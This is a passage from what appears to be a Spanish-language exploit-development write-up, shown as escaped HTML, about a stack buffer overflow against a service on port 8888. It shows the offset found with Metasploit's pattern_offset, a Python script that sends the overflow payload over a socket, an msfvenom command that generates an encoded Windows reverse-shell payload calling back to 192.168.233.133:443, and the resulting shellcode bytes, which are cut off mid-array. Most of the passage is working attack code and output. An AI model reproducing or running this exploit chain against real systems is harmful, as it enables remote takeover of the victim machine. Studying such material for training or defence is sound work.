if __name__ == &apos;__main__&apos;:

        executeExploit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Chequeamos con el Immunity Debuger el numero del EIP »&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 69423569 &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exact match at offset 1052
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos una vez identificada el offset y controlado el EIP a enviar una cadena de Caracteres post EIP para ver donde se almacenan&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;#!/usr/bin/python3

import requests
import signal
import pdb
import sys
import os
import socket

from pwn import *
from struct import pack


def def_handler(sig, frame):
                print(&quot;\n[+] Saliendo ...\n&quot;)
                sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
remoteAddress = &quot;127.0.0.1&quot;

def executeExploit():

        # Posteriormente cogemos el numero del registro del [EIP] y se lo pasamos a pattern-offset
        # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230

        offset = 1052
        before_EIP = b&apos;A&apos;*offset
        EIP = b&apos;BBBB&apos;
        after_EIP = b&apos;C&apos;*300

        payload = before_EIP + EIP + after_EIP
        # Lanzando este Payload verificamos que tenemos el control del EIP y nos fijamos a donde van nuestras Cccs
        # Ahora toca buscar un OPCODE (instrucciones a bajo nivel) para que apunte a un JMP una direccion de Salto para especificar en el EIP

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)



if __name__ == &apos;__main__&apos;:

        executeExploit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para crear nuestras instruciones maliciosas a nivel local. -a (arquitectura) -b (BADChars) -e (encoded ) -f (en C )
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=192.168.233.133 LPORT=443 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f c EXITFUNC=thread&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=443 -b &quot;\X00&quot; -e x86/shikata_ga_nai -f c EXITFUNC=thread                                                                             1 ⨯&lt;/span&gt;
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;iteration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b1&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ea&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1f&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b4&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;49&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;da&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4c&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ea&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5a&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ca&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c9&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f8&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;eb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ec&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;85&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;63&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9d&quot;&lt;/span&gt;
